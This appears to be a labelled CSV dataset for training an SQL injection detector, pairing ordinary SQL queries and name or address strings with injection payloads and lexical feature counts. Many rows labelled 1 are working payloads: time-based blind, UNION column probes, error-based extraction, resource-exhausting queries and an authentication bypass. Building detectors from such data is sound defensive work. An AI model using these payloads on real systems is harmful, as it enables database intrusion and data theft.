Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"   select quite, window, watchfrom edge where onto  is not null",0,select quite window watchfrom edge where onto is not null,63,10,0,0,2,0,10,1,0,48,5,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""cwat"" like ""cwat",1,call regexp_substring repeat right char null and cwat like cwat,124,10,0,3,4,0,21,1,0,53,5,4
select log2 ( 64 ) ;,0,select log2,20,2,0,0,1,0,5,0,0,9,1,1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,1,and select from select sleep fzno and acml like acml,135,10,4,0,0,0,26,2,1,43,6,1
select * from man where prove in  ( select are from way ) ,0,select from man where prove in select are from way,58,10,0,0,0,0,13,0,1,41,6,0
"plza. gazteluzarra, 105 7?b",0,plza gazteluzarra,27,2,0,0,3,0,3,0,0,17,0,0
lar,0,lar,3,1,0,0,0,0,0,0,0,3,0,0
select * from announced where stop = 'tired'  and city = 'oldest',0,select from announced where stop tired and city oldest,65,9,4,0,2,0,11,1,1,46,4,0
" select * from floor order by useful, general",0,select from floor order by useful general,45,7,0,0,1,0,8,0,1,35,4,1
select * from vast order by forest desc,0,select from vast order by forest desc,39,7,0,0,0,0,7,0,1,31,5,0
"   select headed, statement+ ', ' + supply+ ' ' + because+ ', ' + whenever as simple  from bottom",0,select headed statement supply because whenever as simple from bottom,97,10,6,0,3,0,19,0,6,60,3,0
delsa,0,delsa,5,1,0,0,0,0,0,0,0,5,0,0
rodrigo velazquez,0,rodrigo velazquez,17,2,0,0,0,0,1,0,0,16,0,0
select * from look where living = 'given'  and city = 'face',0,select from look where living given and city face,60,9,4,0,2,0,11,1,1,41,4,0
1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,as emtf where or select from select sleep ydpu,119,9,0,0,1,1,25,1,3,38,6,1
monteon pasquina,0,monteon pasquina,16,2,0,0,0,0,1,0,0,15,0,0
tanglao,0,tanglao,7,1,0,0,0,0,0,0,0,7,0,0
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde",1,and utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and ynde ynde,354,24,0,4,27,0,72,2,0,100,9,10
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ibav'  =  'ibav",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and ibav ibav,228,28,4,0,8,0,36,2,1,120,11,1
millares,0,millares,8,1,0,0,0,0,0,0,0,8,0,0
select * from instrument fetch first 3 rows only,0,select from instrument fetch first rows only,48,7,0,0,0,0,8,0,1,38,3,0
select * from excited where class between '1996-07-01' and '1996-07-31',0,select from excited where class between and,71,7,4,0,0,0,9,1,5,37,5,0
select * from tell  where place not like '[pilot]%',0,select from tell where place not like pilot,51,8,2,0,3,0,8,1,1,36,5,0
"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",1,select from generate_series case when then else end limit,118,9,0,0,4,0,23,0,0,48,8,0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 9347 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,102,13,0,0,8,0,15,0,0,71,7,0
select count ( headed )  from never,0,select count headed from never,35,5,0,0,0,0,6,0,0,26,2,1
"-7418 union all select 1340,1340,1340,1340,1340#",1,union all select,48,3,0,0,5,1,4,0,1,14,3,0
"   select employees.phrase, count ( orders.halfwayid )  as roadfrom    ( ordersinner join wonderful on orders.productid  =  employees.girlid ) ",0,select employees phrase count orders halfwayid as roadfrom ordersinner join wonderful on orders productid employees girlid,143,16,0,0,6,0,18,0,0,107,4,1
select shake,0,select shake,12,2,0,0,0,0,1,0,0,11,1,0
1' in boolean mode  )   waitfor delay '0:0:5'#,1,in boolean mode waitfor delay,46,5,3,0,3,1,7,0,0,25,1,2
select * from person order by necessary desc,0,select from person order by necessary desc,44,7,0,0,0,0,7,0,1,36,5,0
"  update newspaper set wherever =  'unit', city =  'captured' where went =  slight",0,update newspaper set wherever unit city captured where went slight,82,10,4,0,4,0,13,0,0,57,3,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",1,select benchmark md5 0x4c4d6142 and poik poik,85,7,0,3,2,0,12,1,0,31,2,2
select count ( explain ) from few,0,select count explain from few,33,5,0,0,0,0,6,0,0,25,3,1
1   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  5333  =  5333,1,and select from pg_sleep and,115,5,0,0,3,0,22,2,0,23,4,1
1'+  (  select brgo where 9100  =  9100 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,select brgo where or select from pg_sleep,102,7,1,0,3,1,20,1,3,34,5,1
4or3554e0a,0,4or3554e0a,10,1,0,0,0,0,0,0,0,4,0,0
delete from dead where rabbit = 'jump',0,delete from dead where rabbit jump,38,6,2,0,1,0,6,0,0,29,3,0
"1""  )   union all select null,null,null--",1,union all select null null null,41,6,0,1,2,1,5,0,2,26,6,0
select * from plates where who = 'crack' limit 3,0,select from plates where who crack limit,48,7,2,0,1,0,9,0,1,34,4,0
"-9352""   )    )     )   or 3038  =  3038",1,or,40,1,0,1,1,0,7,1,1,2,0,0
baumgarten bagudanc,0,baumgarten bagudanc,19,2,0,0,0,0,1,0,0,18,0,0
71196230y,0,71196230y,9,1,0,0,0,0,0,0,0,1,0,0
"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,as wkys where and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,370,25,1,0,26,1,78,1,2,92,10,10
select distinct swimming from happily,0,select distinct swimming from happily,37,5,0,0,0,0,4,0,0,33,3,0
select applied from brief union select voice from sets order by average,0,select applied from brief union select voice from sets order by average,71,12,0,0,0,0,11,0,0,60,7,0
"1"" where 5440  =  5440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,145,17,0,1,7,1,23,1,3,77,7,1
select * from think where shown between '1996-07-01' and '1996-07-31',0,select from think where shown between and,69,7,4,0,0,0,9,1,5,35,5,0
select count ( evening ) from ask,0,select count evening from ask,33,5,0,0,0,0,6,0,0,25,2,1
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,1,select case when then else select end,92,7,0,0,1,1,19,0,3,31,7,0
 update win set affect = 'zero'where must = 'slave',0,update win set affect zero where must slave,51,8,4,0,2,0,9,0,0,36,3,0
7.35961e+15,0,35961e,11,1,0,0,1,0,0,0,1,1,0,0
select count ( blind ) from rule,0,select count blind from rule,32,5,0,0,0,0,6,0,0,24,2,1
select earth ( s from national right join,0,select earth from national right join,41,6,0,0,0,0,7,0,0,33,4,1
select find ( s ) from produce inner join,0,select find from produce inner join,41,6,0,0,0,0,8,0,0,31,4,0
select count ( distinct waste )  from got,0,select count distinct waste from got,41,6,0,0,0,0,7,0,0,31,3,1
6.90524e+15,0,90524e,11,1,0,0,1,0,0,0,1,1,0,0
select * from range where indicate = 'discuss'  and city = 'made',0,select from range where indicate discuss and city made,65,9,4,0,2,0,11,1,1,46,4,0
select top 3 * from discovery,0,select top from discovery,29,4,0,0,0,0,5,0,1,22,3,0
2.25315e+15,0,25315e,11,1,0,0,1,0,0,0,1,1,0,0
select avg ( step ) from say select sum ( wife ) ,0,select avg step from say select sum wife,49,8,0,0,0,0,12,0,0,33,3,2
"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and,144,15,4,0,13,0,23,2,1,66,4,1
5.861e+15,0,861e,9,1,0,0,1,0,0,0,1,1,0,0
select * from movie,0,select from movie,19,3,0,0,0,0,3,0,1,15,2,0
"1'||  (  select 'ozki' where 4435  =  4435   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1,select ozki where select case when then regexp_substring repeat left crypt_key char char char null null else char char char char end from values,384,24,4,0,22,0,75,0,0,119,13,11
c,0,,2,0,0,0,0,0,0,0,0,1,0,0
select * from brain where    not service = 'official',0,select from brain where not service official,53,7,2,0,1,0,8,1,1,38,4,0
tait,0,tait,4,1,0,0,0,0,0,0,0,4,0,0
fontanal callarisa,0,fontanal callarisa,18,2,0,0,0,0,1,0,0,17,0,0
" union   (  select null, null, null,    (  select @@version   )    )    --",1,union select null null null select version,74,7,0,0,5,1,12,0,2,36,6,1
 or ''&',1,or,8,1,3,0,1,0,2,1,0,2,0,0
c63en13759,0,c63en13759,10,1,0,0,0,0,0,0,0,3,0,0
1'||  (  select 'hwdj' where 8179  =  8179,1,select hwdj where,42,3,3,0,3,0,7,0,0,15,2,0
cobea,0,cobea,5,1,0,0,0,0,0,0,0,5,0,0
select cloth from kept,0,select cloth from kept,22,4,0,0,0,0,3,0,0,19,2,0
" select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",1,select from users where id or union select version,81,9,0,1,4,2,17,1,3,42,6,1
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,select from users where id or,55,6,0,0,6,1,14,1,5,24,4,0
"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,where procedure analyse extractvalue concat 0x5c 0x7171706a71 select case when then else end 0x717a767a71,209,14,0,0,7,1,35,0,2,71,7,4
select count ( sinkid ) from sudden,0,select count sinkid from sudden,35,5,0,0,0,0,6,0,0,27,2,1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",1,and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by jpqa,259,18,0,0,9,1,45,1,4,101,8,5
16646,0,,5,0,0,0,0,0,0,0,0,0,0,0
select top 3 * from wave select * from tribe 3select * from football,0,select top from wave select from tribe 3select from football,68,10,0,0,0,0,13,0,3,50,6,0
1.82575e+15,0,82575e,11,1,0,0,1,0,0,0,1,1,0,0
rigente,0,rigente,7,1,0,0,0,0,0,0,0,7,0,0
2.55791e+15,0,55791e,11,1,0,0,1,0,0,0,1,1,0,0
morande,0,morande,7,1,0,0,0,0,0,0,0,7,0,0
"1%"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1,or char char char char regexp_substring repeat left crypt_key char char char null null and,249,15,0,4,20,0,50,2,0,74,5,11
6.39488e+14,0,39488e,11,1,0,0,1,0,0,0,1,1,0,0
1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,in boolean mode and select from select sleep gcrr,101,9,1,0,1,1,21,1,1,41,5,1
select count ( distinct complete )  from wish,0,select count distinct complete from wish,45,6,0,0,0,0,7,0,0,35,3,1
"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",1,select immd where union all select null null null null null null null null,97,14,1,0,9,1,11,0,1,61,13,0
"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,where and char char char char regexp_substring repeat left crypt_key char char char null null,260,15,0,1,18,1,52,1,2,77,5,11
select * from level where replace like '%worry%',0,select from level where replace like worry,48,7,2,0,2,0,7,0,1,36,5,1
delete from catch where could = 'win',0,delete from catch where could win,37,6,2,0,1,0,6,0,0,28,3,0
"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and,168,15,4,0,13,0,27,2,1,66,4,1
select min ( box )  as film from tie,0,select min box as film from tie,36,7,0,0,0,0,8,0,0,25,3,0
11615910j,0,11615910j,9,1,0,0,0,0,0,0,0,1,0,0
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,rlike select from select sleep vwyq,88,6,0,1,2,1,18,0,1,30,4,1
select sleep  (  5  )  -- hlgt,1,select sleep hlgt,30,3,0,0,0,1,6,0,2,15,1,1
-2960' or 2163  =  3143--,1,or,25,1,1,0,1,1,4,1,3,2,0,0
select top 3 * from article where expression = 'alphabet',0,select top from article where expression alphabet,57,7,2,0,1,0,9,0,1,43,4,0
maren-bufford4@fruteriacartaya.yu,0,maren bufford4 fruteriacartaya yu,33,4,0,0,2,0,0,0,1,29,0,0
"  select beautiful,dig,silent from breathing left join orders on edge.lionid =  clothes.sad order by pole.zebra",0,select beautiful dig silent from breathing left join orders on edge lionid clothes sad order by pole zebra,111,18,0,0,6,0,14,0,0,89,7,1
"santa clara, 111, 4?h",0,santa clara,21,2,0,0,3,0,3,0,0,11,0,0
select top 50 percent * from instance,0,select top percent from instance,37,5,0,0,0,0,6,0,1,28,3,0
select * from bone where blue = 'situation' fetch first 3 rows only,0,select from bone where blue situation fetch first rows only,67,10,2,0,1,0,12,0,1,50,4,0
leonel,0,leonel,6,1,0,0,0,0,0,0,0,6,0,0
"1""   )    )    as ufba where 4049  =  4049",1,as ufba where,42,3,0,1,1,0,8,0,0,11,2,0
-5031' or 9323  =  9323#,1,or,24,1,1,0,2,1,4,1,1,2,0,0
select count ( distinct share )  from warm,0,select count distinct share from warm,42,6,0,0,0,0,7,0,0,32,3,1
select * from customers  where city like '[bsp]%';,0,select from customers where city like bsp,50,7,2,0,4,0,7,0,1,35,4,0
select * from hello,0,select from hello,19,3,0,0,0,0,3,0,1,15,2,0
"1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,where or char char char char regexp_substring repeat right char null,199,11,1,0,12,1,39,1,2,57,4,8
54011879j,0,54011879j,9,1,0,0,0,0,0,0,0,1,0,0
"admin"" or ""1""  =  ""1""--",1,admin or,23,2,0,5,1,1,4,1,2,7,1,0
select * from alive,0,select from alive,19,3,0,0,0,0,3,0,1,15,2,0
select * from society where train  between 10 and 20,0,select from society where train between and,52,7,0,0,0,0,9,1,1,37,5,0
select wp_posts.* from wp_posts where 1 = 1 and wp_posts.post_name in  ( 'our-family-template' )  and  (  0  =  1  )  and wp_posts.post_type  =  'wp_template' and   (  (  wp_posts.post_status  =  'publish'  )  )   group by wp_posts.id order by wp_posts.post_date desc,0,select wp_posts from wp_posts where and wp_posts post_name in our family template and and wp_posts post_type wp_template and wp_posts post_status publish group by wp_posts id order by wp_posts post_date desc,267,30,6,0,22,0,38,4,3,166,13,0
"  select replace ( ""xyz fgh xyz"", ""x"", ""m"" ) ;",0,select replace xyz fgh xyz,46,5,0,6,3,0,10,0,0,24,2,1
glatzeder.karr@lamejorplaya.so,0,glatzeder karr lamejorplaya so,30,4,0,0,3,0,0,0,0,27,0,0
"  select islandid as id, skin as because from thousand",0,select islandid as id skin as because from thousand,54,9,0,0,1,0,9,0,0,43,4,0
1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,rlike select from select sleep vwyq,100,6,1,0,2,1,20,0,1,30,4,1
"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,where or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,312,22,0,0,9,1,60,1,5,103,14,5
select * from cave where doing in  ( select ice from principle ) ,0,select from cave where doing in select ice from principle,65,10,0,0,0,0,13,0,1,48,6,0
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",1,or updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71 btqa,145,9,0,0,7,1,23,1,2,37,2,3
-9700'  )   or 8811  =  7862,1,or,28,1,1,0,1,0,5,1,1,2,0,0
claudio iturrieta,0,claudio iturrieta,17,2,0,0,0,0,1,0,0,16,0,0
select * from layers fetch first 3 rows only select top 50 percent * from below,0,select from layers fetch first rows only select top percent from below,79,12,0,0,0,0,15,0,2,59,6,0
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""xwnw""  =  ""xwnw",1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and xwnw xwnw,149,23,0,4,9,0,24,2,1,83,8,1
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1,union all select,61,3,1,0,7,1,4,0,3,14,3,0
select avg ( ice ) from universe,0,select avg ice from universe,32,5,0,0,0,0,6,0,0,24,2,1
"""  )   or   (  ""x""  )    =    (  ""x",1,or,35,1,0,4,1,0,8,1,0,4,0,0
select avg ( price ) from empty,0,select avg price from empty,31,5,0,0,0,0,6,0,0,23,2,1
"doctor ramon sanchez-parra, 17 11?d",0,doctor ramon sanchez parra,35,4,0,0,2,0,4,0,1,24,0,0
select chain from service union select square from breathing order by inside,0,select chain from service union select square from breathing order by inside,76,12,0,0,0,0,11,0,0,65,7,0
1'+  (  select 'yjpp' where 8966  =  8966,1,select yjpp where,41,3,3,0,1,0,7,0,1,15,2,0
select * from becoming order by chain desc,0,select from becoming order by chain desc,42,7,0,0,0,0,7,0,1,34,5,0
"1'  )   union all select null,null,null,null,null,null,null--",1,union all select null null null null null null null,61,10,1,0,6,1,5,0,2,42,10,0
"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""rfam"" like ""rfam",1,select case when then regexp_substring repeat right char null else char char char char end from information_schema system_users and rfam like rfam,326,22,0,4,14,0,57,1,0,122,11,8
keely4,0,keely4,6,1,0,0,0,0,0,0,0,5,0,0
select * from tired where price not between 10 and 20,0,select from tired where price not between and,53,8,0,0,0,0,10,2,1,38,6,0
select * from adventure fetch first 50 percent rows onlyselect top 3 * from education,0,select from adventure fetch first percent rows onlyselect top from education,85,11,0,0,0,0,14,0,2,66,5,0
" select a.customername as customername1, b.customername as customername2, a.city from customers a, customers b where a.customerid <> b.customerid and a.city  =  b.city order by a.city;",0,select customername as customername1 customername as customername2 city from customers customers where customerid customerid and city city order by city,184,20,0,0,15,0,24,1,2,141,8,0
8.58629e+14,0,58629e,11,1,0,0,1,0,0,0,1,1,0,0
select count ( baby ) from recent,0,select count baby from recent,33,5,0,0,0,0,6,0,0,25,2,1
"select * from mother where improve between ""greatest"" and    ""circle""",0,select from mother where improve between greatest and circle,69,9,0,4,0,0,9,1,1,52,5,1
"1%'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and,195,12,4,0,9,0,36,2,1,46,6,3
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1,select from users where id union select version,76,8,0,0,6,1,15,0,3,40,5,1
select * from shout where talk not between 'importance' and 'grade',0,select from shout where talk not between importance and grade,67,10,4,0,0,0,10,2,1,52,6,0
"-6335""   )    )     )   union all select 3654--",1,union all select,47,3,0,1,0,1,7,0,3,14,3,0
9.8986e+14,0,8986e,10,1,0,0,1,0,0,0,1,1,0,0
olea de boedo,0,olea de boedo,13,3,0,0,0,0,2,0,0,11,0,0
"  select gave as add, welcome as [river]  from officer",0,select gave as add welcome as river from officer,54,9,0,0,3,0,9,0,0,40,4,0
end and    (    (     (  'hglq' like 'hglq,1,end and hglq like hglq,42,5,3,0,0,0,7,1,0,18,3,0
select felt,0,select felt,11,2,0,0,0,0,1,0,0,10,1,0
lohr@show.nom.ad,0,lohr show nom ad,16,4,0,0,3,0,0,0,0,13,0,0
select * from rush fetch first 50 percent rows only,0,select from rush fetch first percent rows only,51,8,0,0,0,0,9,0,1,39,3,0
naut aran,0,naut aran,9,2,0,0,0,0,1,0,0,8,0,0
"1'+  (  select 'ndpx' where 4061  =  4061 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,select ndpx where or select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,163,19,3,0,7,1,26,1,4,86,8,1
"1'   )    )    union all select null,null,null,null,null,null--",1,union all select null null null null null null,63,9,1,0,5,1,6,0,2,38,9,0
select camp ( s )  from situation full outer join,0,select camp from situation full outer join,49,7,0,0,0,0,9,0,0,37,4,0
"-1859' union all select 1781,1781,1781,1781#",1,union all select,44,3,1,0,4,1,4,0,1,14,3,0
94731203e,0,94731203e,9,1,0,0,0,0,0,0,0,1,0,0
"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,as lizu where or char char char char regexp_substring repeat left crypt_key char char char null null,272,17,1,0,18,1,55,1,2,82,6,11
"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,and dbms_pipe receive_message chr chr chr chr,140,7,0,1,12,1,27,1,2,37,1,6
select avg ( price ) from spread,0,select avg price from spread,32,5,0,0,0,0,6,0,0,24,2,1
atilio,0,atilio,6,1,0,0,0,0,0,0,0,6,0,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,1,select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and,111,16,0,3,7,0,16,1,1,72,6,1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28547 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,103,13,0,0,8,0,15,0,0,71,7,0
1'||  (  select 'aioq' from dual where 8176  =  8176,1,select aioq from dual where,52,5,3,0,3,0,9,0,0,23,3,0
select distinct noise from pony,0,select distinct noise from pony,31,5,0,0,0,0,4,0,0,27,3,0
select avg ( they ) from bone,0,select avg they from bone,29,5,0,0,0,0,6,0,0,21,2,1
calle clavel 30 11?b,0,calle clavel,20,2,0,0,1,0,3,0,0,12,0,0
"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,select scba where and select count from generate_series,133,8,3,0,6,1,23,1,3,47,5,1
1   )    )    as ipfy where 1189  =  1189,1,as ipfy where,41,3,0,0,1,0,8,0,0,11,2,0
select * from  ( select state from path ) ,0,select from select state from path,42,6,0,0,0,0,9,0,1,29,4,0
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,as icik where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,165,19,1,0,7,1,27,1,3,83,8,1
select * from pretty where up  between 10 and 20,0,select from pretty where up between and,48,7,0,0,0,0,9,1,1,33,5,0
select * from ranch where flow between largest09/01/1996row and area15/31/1996highest,0,select from ranch where flow between largest09 1996row and area15 1996highest,85,11,0,0,0,0,9,1,5,55,5,0
select top 3 * from roar where tomorrow = 'light',0,select top from roar where tomorrow light,49,7,2,0,1,0,9,0,1,35,4,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",1,select dbms_pipe receive_message chr chr chr chr from dual and qomf like qomf,148,13,3,0,10,0,27,1,0,63,4,6
select * from island where theory  between 10 and 20,0,select from island where theory between and,52,7,0,0,0,0,9,1,1,37,5,0
"calle plantio, 178,",0,calle plantio,19,2,0,0,2,0,2,0,0,12,0,0
"  select eggid as id, sitting as him from throw",0,select eggid as id sitting as him from throw,47,9,0,0,1,0,9,0,0,36,4,0
select * from picture  where second = above,0,select from picture where second above,43,6,0,0,1,0,7,0,1,33,3,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1,call regexp_substring repeat left crypt_key char char char null null and,173,11,3,0,12,0,33,1,0,60,5,7
"select productname, unitprice *  ( unitsinstock + nvl ( unitsonorder, 0  )  )   from products;",0,select productname unitprice unitsinstock nvl unitsonorder from products,94,8,0,0,3,0,14,0,2,65,2,0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c87dd67714' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,select wp_posts id from wp_posts where and wp_posts post_type acf field and wp_posts post_status publish and wp_posts post_name field_5f6c87dd67714 order by wp_posts menu_order asc wp_posts post_title asc limit,256,28,6,0,25,0,32,3,1,161,11,0
mccollon@irmedia.ca,0,mccollon irmedia ca,19,3,0,0,2,0,0,0,0,17,0,0
select * from  ( select service from series ) ,0,select from select service from series,46,6,0,0,0,0,9,0,1,33,4,0
select * from label where against = 'trade'  and  ( heard = 'biggest' or flow = 'simple' ) ,0,select from label where against trade and heard biggest or flow simple,91,12,6,0,3,0,18,2,1,59,5,0
